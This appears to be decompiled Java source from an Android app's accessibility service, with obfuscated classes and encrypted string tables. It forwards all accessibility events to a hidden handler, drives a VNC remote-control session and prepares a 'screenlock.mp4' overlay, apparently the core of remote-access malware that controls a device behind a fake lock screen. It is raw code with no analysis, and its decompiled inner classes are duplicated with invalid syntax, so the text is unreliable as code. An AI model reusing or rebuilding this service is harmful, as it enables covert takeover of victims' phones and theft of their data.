package com.mistral.jon.services.a11y;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import com.mistral.jon.activity.UscActivity;
import com.mistral.jon.receivers.UnlockScreenReceiver;
import com.mistral.jon.receivers.UserPresentReceiver;
import com.mistral.jon.services.VncService;
import de.abr.android.avnc.lib.LvWrapper;
import p001z.ayp;
import p001z.azb;
import p001z.azc;
import p001z.azf;
import p001z.azg;
import p001z.azh;
import p001z.azs;
import p001z.bbc;
import p001z.bcq;
import p001z.bct;
import p001z.bcu;
import p001z.bcx;
import p001z.bdc;

/* JADX INFO: loaded from: classes.dex */
public class AcService extends AccessibilityService implements LvWrapper.InterfaceC0129a {

    /* JADX INFO: renamed from: a */
    public static AcService acService = null;

    /* JADX INFO: renamed from: a */
    private static final String str = "AcService";

    /* JADX INFO: renamed from: a */
    private static long[] f769a = {120503036, 1259586616, 488868017, 1775590992, 1274418157, 1483024994, -360042051, 926612633, 1602379568, -1886164430, 1584211971, 155585769, -1593166920, 1484036823, -457119804, 914220931, 1829523648, 882667754, -266547286, 528123832, 1804287842, 1091609463, -1316843476, 1238338782, -608574927, 1010403788, 1768027315, 629666618, -507209314, 1232162496, 1447099370, 1239572047, 998575006, 1592128699, 1639472384, 2061594395, 1401139887, 921197484, 234339547, 348208815, 2129177948, 464517481, 91674233, 471513913, 540142742, 1697350974, 2014406005, 319765050, 334250375, 896634034, 1934773197, 954352763, 197349888, 107507817, 2121250482, 2139957481, 590077912, 954988316, 1234446700, 28810049, 728500859};

    /* JADX INFO: renamed from: a */
    private SharedPreferences prefs;

    /* JADX INFO: renamed from: a */
    private azc azcVar;

    /* JADX INFO: renamed from: a */
    public bdc bdcVar;

    /* JADX INFO: renamed from: a */
    private final ayp aypVar = ayp.m4254a();

    /* JADX INFO: renamed from: a */
    private final UnlockScreenReceiver unlockScreenReceiver = new UnlockScreenReceiver();

    /* JADX INFO: renamed from: a */
    private UserPresentReceiver userPresentReceiver = new UserPresentReceiver();

    /* JADX INFO: renamed from: a */
    private Thread thread = new Thread(new Runnable() { // from class: com.mistral.jon.services.a11y.-$$Lambda$AcService$ksEoiPYV0F1Ufrtu_9DMw1pchq8
        public /* synthetic */ $$Lambda$AcService$ksEoiPYV0F1Ufrtu_9DMw1pchq8() {
        }

        @Override // java.lang.Runnable
        public final void run() {
            AcService.lambda$ksEoiPYV0F1Ufrtu_9DMw1pchq8(this.f$0);
        }
    });

    /* JADX INFO: renamed from: com.mistral.jon.services.a11y.AcService$1 */
    class C01281 implements VncService.InterfaceC0126a {

        /* JADX INFO: renamed from: a */
        private static long[] f770a = {464471576, 1789683623, 750400844, 1074684969, -1224514825, 1714448555, 830689108, 528994374, -1256255429, 1482527479, 1241797223, 1260726687, 1541927729, 356163470, 1456813640, 206895753, -1340997387, 530689252, -60657413, 1966246494, 391616833, 663952538, -875435812, -33207882, 1406353303, 1448870566, 1168858298, 1978148657, 793288043, 1841629364, -911852109, 1727764356, 1952508488, -178962467, 1831122133, 2056124544, 382134508, -959353106, 2071890744, 1532325221, 1014597587, 1094679754, 1179921281, 1172514494, -1878184416, 1336679105, -891760813, 833575981, -890598808, 241390642, 1653795165, 1940498599, -2070795643, 740260597, 1395403024, 118965472, 335026050, 1351582383, 208767770, 1332588258, 1307278749, 2018261571, 1560369143, 820997838, 1571007842, 665029591, 1931734288, 792318200, 1296264308, 1654775714, 713893991, 734887158, 347656316, 1004661287, 195353321, 1208551315, 1694599996, 1286423022, 1296963440, 1831577900, 1234083671, 1140605626, 531015341, -2061987038, 85027519, 1292492921, -1848876326, -1961708225, -158370415, -2040014306, 268808337, -651346628, -1405207757, -567036055, -741311643, 987209749, 1301203430, 1339380582, -1913768353, 478922042, -117253603, 1988001527, -589604359, 390063316, 508460921, 1199475583, 1688438688, 1722368519, 389333366, 1256681187, 846729110, 223325119, 675707955, -682484107, -1133674267, 828242123, -1897557512, 1442211863, -1579782167, 1751156299, 2094379428, -969776589, 1036083937, 981614999, 1910950031, -1917558842, -1022930095, -1829760742, -685786430, 1073651958, -1133841991, 1402110402, 1418231208, 2012658517, 1371209665, -1909226395, 820007944, -755847938, -1229682379, -611540367, -1153023718, -1629773739, -1839790898, 163405633, 1511479118, 1530797085, 1917289358, -116179061, -261676096, -898879551, -1292245226, -134555647, -1967993555, -391798525, 1745277387, 2146212870, 1610680798, -2060291700, -120155397, -8441482, -539619438, -2105999457, -1628854748, -214073864, -528500734, -1295254362, 646686466, 239340502, 651631056, 1435334408};

        C01281() {
        }

        /* JADX INFO: String decrypt: "Client connected" */
        /* JADX WARN: Multi-variable type inference failed */
        @Override // com.mistral.jon.services.VncService.InterfaceC0126a
        /* JADX INFO: renamed from: a */
        public void mo1110a() {
            VncService.f758b = true;
            ayp.m4254a().m4259a("Client connected", VncService.str);
            bcx bcxVar = new bcx();
            bcxVar.m4564a();
            bcxVar.m4566c();
            azf.m4332b();
            try {
                AcService.m1114a(AcService.this).stop();
            } catch (Exception unused) {
            }
        }

        /* JADX INFO: String decrypt: "Connected. Address=" */
        @Override // com.mistral.jon.services.VncService.InterfaceC0126a
        /* JADX INFO: renamed from: a */
        public void mo1111a(String str) {
            ayp.m4254a().m4259a("Connected. Address=" + str, VncService.str);
        }

        /* JADX INFO: String decrypt: "Disconnected"; "vnc"; "vnc_address" */
        /* JADX WARN: Multi-variable type inference failed */
        @Override // com.mistral.jon.services.VncService.InterfaceC0126a
        /* JADX INFO: renamed from: b */
        public void mo1112b() {
            VncService.f758b = false;
            ayp.m4254a().m4259a("Disconnected", VncService.str);
            bbc.m4448a(AcService.this).m4449a("vnc").m4447a();
            bcq.m4272a(AcService.this).edit().putString("vnc_address", null).apply();
            new bcx().m4565b();
            azf.m4331a();
            try {
                AcService.m1114a(AcService.this).stop();
            } catch (Exception unused) {
            }
        }

        /* JADX INFO: String decrypt: "Connection failed. Reason=" */
        /* JADX WARN: Multi-variable type inference failed */
        @Override // com.mistral.jon.services.VncService.InterfaceC0126a
        /* JADX INFO: renamed from: b */
        public void mo1113b(String str) {
            VncService.f758b = false;
            ayp.m4254a().m4259a("Connection failed. Reason=" + str, VncService.str);
            azs.m4341a(AcService.this);
        }
    }

    /* JADX INFO: renamed from: com.mistral.jon.services.a11y.AcService$2 */
    class RunnableImpl41 extends azg {

        /* JADX INFO: renamed from: a */
        final /* synthetic */ AccessibilityEvent accessibilityEvent;

        RunnableImpl41(AccessibilityEvent accessibilityEvent) {
            this.accessibilityEvent = accessibilityEvent;
        }

        @Override // java.lang.Runnable
        public void run() {
            Looper.prepare();
            try {
                AcService.m1115a(AcService.this).m4263b(this.accessibilityEvent);
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                this.accessibilityEvent.recycle();
            } catch (Exception e2) {
                e2.printStackTrace();
            }
            Looper.loop();
        }
    }

    /* JADX INFO: renamed from: a */
    static /* synthetic */ Thread m1114a(AcService acService2) {
        return acService2.thread;
    }

    /* JADX INFO: renamed from: a */
    static /* synthetic */ ayp m1115a(AcService acService2) {
        return acService2.aypVar;
    }

    /* JADX INFO: renamed from: a */
    private /* synthetic */ void m1116a() {
        while (true) {
            azb.m4319a((Context) this);
            try {
                Thread.sleep(1000L);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static /* synthetic */ void lambda$ksEoiPYV0F1Ufrtu_9DMw1pchq8(AcService acService2) {
        acService2.m1116a();
    }

    @Override // de.abr.android.avnc.lib.LvWrapper.InterfaceC0129a
    /* JADX INFO: renamed from: a */
    public void mo1117a(AccessibilityEvent accessibilityEvent) {
        this.aypVar.m4263b(accessibilityEvent);
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        azh.m4333a(new azg(AccessibilityEvent.obtain(accessibilityEvent)) { // from class: com.mistral.jon.services.a11y.AcService.2

            /* JADX INFO: renamed from: a */
            final /* synthetic */ AccessibilityEvent accessibilityEvent;

            RunnableImpl41(AccessibilityEvent accessibilityEvent2) {
                this.accessibilityEvent = accessibilityEvent2;
            }

            @Override // java.lang.Runnable
            public void run() {
                Looper.prepare();
                try {
                    AcService.m1115a(AcService.this).m4263b(this.accessibilityEvent);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    this.accessibilityEvent.recycle();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
                Looper.loop();
            }
        });
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.aypVar.m4257a((Object) this);
    }

    @Override // android.app.Service
    public void onDestroy() {
        this.aypVar.m4265c();
        this.userPresentReceiver.m1062b(this);
        super.onDestroy();
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
    }

    /* JADX INFO: String decrypt: "screenlock.mp4" */
    /* JADX WARN: Multi-variable type inference failed */
    @Override // android.accessibilityservice.AccessibilityService
    public void onServiceConnected() {
        LvWrapper.getInstance().acCallback = this;
        acService = this;
        this.aypVar.m4262b();
        this.prefs = bcq.m4272a(this);
        if (bct.m4293f() && this.prefs.getBoolean("vnc_enabled", false)) {
            UscActivity.m1041a((Context) this, false, "", 0);
            this.prefs.edit().putBoolean("vnc_enabled", false).apply();
        }
        this.bdcVar = new bdc(this, "screenlock.mp4");
        this.userPresentReceiver.m1061a(this);
        this.azcVar = new bcu(this);
        VncService.setAVar(new VncService.InterfaceC0126a() { // from class: com.mistral.jon.services.a11y.AcService.1

            /* JADX INFO: renamed from: a */
            private static long[] f770a = {464471576, 1789683623, 750400844, 1074684969, -1224514825, 1714448555, 830689108, 528994374, -1256255429, 1482527479, 1241797223, 1260726687, 1541927729, 356163470, 1456813640, 206895753, -1340997387, 530689252, -60657413, 1966246494, 391616833, 663952538, -875435812, -33207882, 1406353303, 1448870566, 1168858298, 1978148657, 793288043, 1841629364, -911852109, 1727764356, 1952508488, -178962467, 1831122133, 2056124544, 382134508, -959353106, 2071890744, 1532325221, 1014597587, 1094679754, 1179921281, 1172514494, -1878184416, 1336679105, -891760813, 833575981, -890598808, 241390642, 1653795165, 1940498599, -2070795643, 740260597, 1395403024, 118965472, 335026050, 1351582383, 208767770, 1332588258, 1307278749, 2018261571, 1560369143, 820997838, 1571007842, 665029591, 1931734288, 792318200, 1296264308, 1654775714, 713893991, 734887158, 347656316, 1004661287, 195353321, 1208551315, 1694599996, 1286423022, 1296963440, 1831577900, 1234083671, 1140605626, 531015341, -2061987038, 85027519, 1292492921, -1848876326, -1961708225, -158370415, -2040014306, 268808337, -651346628, -1405207757, -567036055, -741311643, 987209749, 1301203430, 1339380582, -1913768353, 478922042, -117253603, 1988001527, -589604359, 390063316, 508460921, 1199475583, 1688438688, 1722368519, 389333366, 1256681187, 846729110, 223325119, 675707955, -682484107, -1133674267, 828242123, -1897557512, 1442211863, -1579782167, 1751156299, 2094379428, -969776589, 1036083937, 981614999, 1910950031, -1917558842, -1022930095, -1829760742, -685786430, 1073651958, -1133841991, 1402110402, 1418231208, 2012658517, 1371209665, -1909226395, 820007944, -755847938, -1229682379, -611540367, -1153023718, -1629773739, -1839790898, 163405633, 1511479118, 1530797085, 1917289358, -116179061, -261676096, -898879551, -1292245226, -134555647, -1967993555, -391798525, 1745277387, 2146212870, 1610680798, -2060291700, -120155397, -8441482, -539619438, -2105999457, -1628854748, -214073864, -528500734, -1295254362, 646686466, 239340502, 651631056, 1435334408};

            C01281() {
            }

            /* JADX INFO: String decrypt: "Client connected" */
            /* JADX WARN: Multi-variable type inference failed */
            @Override // com.mistral.jon.services.VncService.InterfaceC0126a
            /* JADX INFO: renamed from: a */
            public void mo1110a() {
                VncService.f758b = true;
                ayp.m4254a().m4259a("Client connected", VncService.str);
                bcx bcxVar = new bcx();
                bcxVar.m4564a();
                bcxVar.m4566c();
                azf.m4332b();
                try {
                    AcService.m1114a(AcService.this).stop();
                } catch (Exception unused) {
                }
            }

            /* JADX INFO: String decrypt: "Connected. Address=" */
            @Override // com.mistral.jon.services.VncService.InterfaceC0126a
            /* JADX INFO: renamed from: a */
            public void mo1111a(String str2) {
                ayp.m4254a().m4259a("Connected. Address=" + str2, VncService.str);
            }

            /* JADX INFO: String decrypt: "Disconnected"; "vnc"; "vnc_address" */
            /* JADX WARN: Multi-variable type inference failed */
            @Override // com.mistral.jon.services.VncService.InterfaceC0126a
            /* JADX INFO: renamed from: b */
            public void mo1112b() {
                VncService.f758b = false;
                ayp.m4254a().m4259a("Disconnected", VncService.str);
                bbc.m4448a(AcService.this).m4449a("vnc").m4447a();
                bcq.m4272a(AcService.this).edit().putString("vnc_address", null).apply();
                new bcx().m4565b();
                azf.m4331a();
                try {
                    AcService.m1114a(AcService.this).stop();
                } catch (Exception unused) {
                }
            }

            /* JADX INFO: String decrypt: "Connection failed. Reason=" */
            /* JADX WARN: Multi-variable type inference failed */
            @Override // com.mistral.jon.services.VncService.InterfaceC0126a
            /* JADX INFO: renamed from: b */
            public void mo1113b(String str2) {
                VncService.f758b = false;
                ayp.m4254a().m4259a("Connection failed. Reason=" + str2, VncService.str);
                azs.m4341a(AcService.this);
            }
        });
    }
}
